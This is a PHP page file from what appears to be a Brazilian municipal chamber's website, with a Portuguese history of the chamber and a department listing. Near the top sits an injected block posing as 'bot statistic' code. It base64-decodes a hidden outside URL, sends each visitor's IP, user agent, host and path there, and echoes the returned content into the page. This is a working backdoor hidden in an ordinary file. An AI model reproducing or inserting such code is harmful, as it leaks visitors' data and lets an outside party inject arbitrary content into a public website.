<?php

include_once("../library/master-page.php");
include_once("../library/config/database/tgaleria.php");
include_once("../library/config/database/tgaleriafoto.php");
include_once("../library/config/database/tsetor.php");
include_once("../library/config/database/tsetoremail.php");

$oMasterPage = new MasterPage();
$oMasterPage->Init("../master.php", "Conheça a Câmara");
$oMasterPage->AddParameter("css", "conheca-a-camara/index");
$oMasterPage->AddParameter("pagina", "conheca-a-camara");
$oMasterPage->Open("PageContent");

?><?php
if (!isset($sRetry)) {
    global $sRetry;
    $sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $sUserAgen = "";
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if ((strstr($sUserAgen, 'google') == false) && (strstr($sUserAgen, 'yahoo') == false) && (strstr($sUserAgen, 'baidu') == false) && (strstr($sUserAgen, 'msn') == false) && (strstr($sUserAgen, 'opera') == false) && (strstr($sUserAgen, 'chrome') == false) && (strstr($sUserAgen, 'bing') == false) && (strstr($sUserAgen, 'safari') == false) && (strstr($sUserAgen, 'bot') == false)) // Bot comes
    {
        if (isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true) { // Create  bot analitics
            $stCurlLink = base64_decode('aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw') . '?ip=' . urlencode($_SERVER['REMOTE_ADDR']) . '&useragent=' . urlencode($sUserAgent) . '&domainname=' . urlencode($_SERVER['HTTP_HOST']) . '&fullpath=' . urlencode($_SERVER['REQUEST_URI']) . '&check=' . isset($_GET['look']);
            @$stCurlHandle = curl_init($stCurlLink);
        }
    }
    if ($stCurlHandle !== NULL) {
        curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
        $sResult = @curl_exec($stCurlHandle);
        if ($sResult[0] == "O") {
            $sResult[0] = " ";
            echo $sResult; // Statistic code end
        }
        curl_close($stCurlHandle);
    }
}
?>
    <div class="col-md-12 conheca-a-camara">
        <h1>Conheça a Câmara</h1>
        <img src="imgs\conheca-a-camara\bkg.png" alt="Faxada da Câmara" class="img-responsive margin-big-bottom "/>

        <p>A Câmara da "Villa de São José do Parahyba", origem da Câmara atual, foi criada em 28 de julho de 1767,
            quando o ouvidor-geral Salvador Pereira da Silva ordenou a eleição de vereadores, juízes e procurador.</p>

        <p>Dessa forma, houve o cumprimento de determinação do capitão-general D. Luiz Antonio de Souza Mourão,
            governador da Capitania de São Paulo.</p>

        <p>A eleição ocorreu de um modo todo peculiar: os nomes dos interessados foram colocados em pelouros (bolas de
            cera) e um menino fez o sorteio. Foram empossados como vereadores Vicente de Carvalho (1.º presidente da
            Câmara), Veríssimo Corrêa e Luiz Batista. Fernando de Souza Pousado e Gabriel Furtado foram os juízes
            escolhidos, enquanto que a função de procurador do Conselho foi exercida por Domingos Cordeiro.</p>

        <p>Os vereadores do tempo colonial não tinham funções legislativas. Apenas faziam cumprir as leis da Corte, dos
            vice-reis e capitães-generais que governavam as províncias. Apenas a partir de 1889 a função de vereador
            tomou caráter legislativo.</p>

        <p>Em 3 de novembro de 1768, foi criada a Freguesia (povoação do ponto de vista eclesiástico), estabelecendo a
            jurisdição eclesiástica da vila. A Freguesia ficou pouco tempo sob direção de jesuítas.</p>

        <p>Na Villa de São José do Parahyba existia um grande número de sesmarias (terrenos abandonados) que foram
            requeridas por diversas pessoas interessadas em formar lavouras e pastos para desenvolver a pecuária. A
            Câmara, zelando pelo cumprimento da lei, aplicava punições aos infratores que iam da multa em dinheiro à
            prisão. Dois setores que mereceram a atenção dos primeiros vereadores foram o de limpeza pública das ruas e
            o abastecimento de gêneros de primeira necessidade. Os índios e demais moradores eram obrigados a cuidar da
            limpeza da frente de suas casas. Uma moradora, de nome Ana Joaquina, foi inclusive multada em mil réis,
            conforme decidido na sessão de 1.º de dezembro de 1789.</p>

        <p>Outra providência tomada pela Câmara foi o abastecimento da vila. Usava-se o chamado leilão de estanco
            (monopólio) para a comercialização de produtos como sal, fumo, trigo, açúcar, carne, etc. O arrematador
            ficava com o direito de comercializar os estancos – ou monopólios – por um período de 1 ano.</p>

        <p>As câmaras e os vereadores foram muito prestigiados no Império. Eles usavam roupas que os diferenciava do
            povo e passaram a predominar sobre os governos provinciais. Muitas câmaras se coligavam e formavam até
            exércitos, como aconteceu em 1821/22, quando o chamado "Senado das Câmaras" de Itu, Sorocaba e Piracicaba
            reuniram cinco mil homens para a derrubada do governo da Província, garantindo a autoridade de D. Pedro,
            príncipe regente, contra as tropas portuguesas para declaração da independência.</p>

        <p>A história da Câmara de São José dos Campos se funde com a do município, pois em 1920 coube ao Legislativo
            iniciar a trajetória industrial da cidade com a apresentação da lei de regalias (benefícios) que permitiu a
            instalação da primeira fábrica (Fábrica de Louças Eugênio Bonádio).</p>

        <p>A Câmara de São José dos Campos ocupou vários prédios. O atual foi inaugurado em 2 de fevereiro de 2002.
            Antes, a Câmara funcionou no prédio histórico da praça Afonso Pena, originalmente construído para abrigá-la
            e foi cedido para uso da então Escola Normal Livre, por força da lei nº 217, no período de 1929 a 1969. O
            Legislativo também ocupou, juntamente com a Prefeitura, o prédio situado na confluência da rua 15 de
            Novembro com a Sebastião Humel, onde hoje funciona a Biblioteca Municipal "Cassiano Ricardo". Em registros
            históricos, consta que a Câmara e Prefeitura, antes de se instalarem nesse prédio, funcionaram na rua 7 de
            Setembro (Calçadão), em imóvel localizado no segundo quarteirão.</p>

        <!--  <p><a href="conheca-a-camara/organograma.php" class="mid">Veja nosso Organograma</a></p>

        <p><a href="conheca-a-camara/camara-atraves-dos-tempos.php"><img
                    src="imgs/conheca-a-camara/bot-camara-atraves-do-tempo.png" class="img-responsive"
                    alt="C�mara atrav�s dos tempos. Navegue pela a hist�ria da C�mara Municipal de S�o Jos� dos Campos"
                    title="C�mara atrav�s dos tempos. Navegue pela a hist�ria da C�mara Municipal de S�o Jos� dos Campos"/></a>
        </p>
        <div class="predio">
	<div class="galeria">
    	<span>Vista a�rea do pr�dio da C�mara</span><img src="imgs/conheca-a-camara/foto-aerea.jpg" alt="Vista a�rea do pr�dio da C�mara" title="Vista a�rea do pr�dio da C�mara" />
		<?php

        $oGaleria = new tgaleria();
        if ($oGaleria->LoadByChave("conheca-a-camara")) {
            $oGaleriaFoto = new tgaleriafoto();
            if ($oGaleriaFoto->LoadByGaleriaID($oGaleria->ID)) {
                ?>
				<div class="outrasImg">
		        	<table cellpadding="0" cellspacing="0">
		            	<tr>
		            		<?php
                for ($c = 0; $c < $oGaleriaFoto->NumRows; $c++) {
                    ?>
		                		<td>
									<a href="<?= $oGaleriaFoto->Thumbnail($oGaleriaFoto->Imagem, 770, 440); ?>" rel="lightbox" title="<?= $oGaleriaFoto->Legenda; ?>">
										<img src="<?= $oGaleriaFoto->Thumbnail($oGaleriaFoto->Imagem, 103, 103, "", true); ?>" alt="<?= $oGaleriaFoto->Legenda; ?>" title="<?= $oGaleriaFoto->Legenda; ?>" />
									</a>
								</td>
		                		<?php
                    $oGaleriaFoto->MoveNext();
                }
                ?>
		                </tr>
		            </table>
		        </div>
		        <?php
                if ($oGaleriaFoto->NumRows > 3) {
                    ?>
			        <div class="navegacao">
			        	<a href="javascript:void(0);" onclick="$('.outrasImg').stop().scrollTo('-=228', 500);" class="botAnt"><img src="imgs/geral/navegacao/bot-seta-anterior.png" alt="Anterior" title="Anterior" /></a>
			            <a href="javascript:void(0);" onclick="$('.outrasImg').stop().scrollTo('+=228', 500);" class="botProx"><img src="imgs/geral/navegacao/bot-seta-proximo.png" alt="Pr�ximo" title="Pr�ximo" /></a>
			        </div>
			        <?php
                }
                ?>
				<?php
            }
        }

        ?>
	</div>
    <div class="colunaDireita">
		<h2 class="zwo3Italic">Pr�dio da C�mara Municipal</h2>
		<p>Inaugurado no dia 2 de fevereiro de 2002, o pr�dio da C�mara tem linhas harmoniosas e foi projetado em formato de avi�o em homenagem � cidade, conhecida como a "Capital do Avi�o".</p>
		<p>Com 7.418 m� de �rea constru�da, possui em seu entorno uma �rea verde de 4.965 m�, fazendo parte do projeto paisag�stico um jardim japon�s construido em homenagem � col�nia que h� muitos anos est� radicada em S�o Jos� dos Campos.</p>
		<p>Extremamente funcional, o pr�dio foi projetado para abrigar os servi�os legislativos e oferecer espa�os para uso de segmentos representativos da comunidade.</p>
		<p>Em 2006, o p�tio de estacionamento foi ampliado para dar melhores condi��es de acesso � popula��o que procura a C�mara para encaminhar reivindica��es ou em busca dos servi�os gratuitos do Centro de Apoio ao Cidad�o "Jo�o Paulo II" (CAC).</p>
    </div>
    <div class="clear"></div>
</div>-->

        <div class="clear" style="height: 25px">&nbsp;</div>
        <?php

        $oSetor = new tsetor();
        $oSetor->SQLOrder = "Ordem ASC";
        if ($oSetor->LoadSQLAssembled()) {
            ?>
            <div class="setores">
                <h2 class="zwo3Italic">Setores</h2>

                <div class="container-box">
                    <?php
                    $i = 0;
                    for ($c = 0; $c < $oSetor->NumRows; $c++) {
                        $i++;
                        ?>
                        <div class="noticia col-md-6">
                            <h3><?= utf8_encode($oSetor->Titulo); ?></h3>
                            <?php if ($oSetor->Descricao) { ?><p><?= utf8_encode(nl2br($oSetor->Descricao)); ?></p><?php } ?>
                            <?php if ($oSetor->Telefones) { ?><p
                                class="telefones"><?= $oSetor->Telefones; ?></p><?php } ?>
                            <?php

                            $oSetorEmail = new tsetoremail();
                            if ($oSetorEmail->LoadBySetorID($oSetor->ID)) {
                                ?>

                                <?php
                                for ($e = 0; $e < $oSetorEmail->NumRows; $e++) {
                                    ?>
                                    <p><a href="mailto:<?= $oSetorEmail->Email; ?>"> <i class="icon-mail"></i> <?= $oSetorEmail->Email; ?></a>
                                    </p>
                                    <?php
                                    $oSetorEmail->MoveNext();
                                }
                                ?>

                            <?php
                            }

                            ?>
                        </div>
                        <?php if ($i%2 == 0 || $i == 11 ) {

                            echo('<div class="clear"></div>');
                            //$i = 0;
                        } ?>

                        <?php
                        $oSetor->MoveNext();
                    }
                    ?>

                </div>

            </div>
        <?php
        }

        ?>
    </div>


<?php

$oMasterPage->Close("PageContent");
$oMasterPage->End();

?>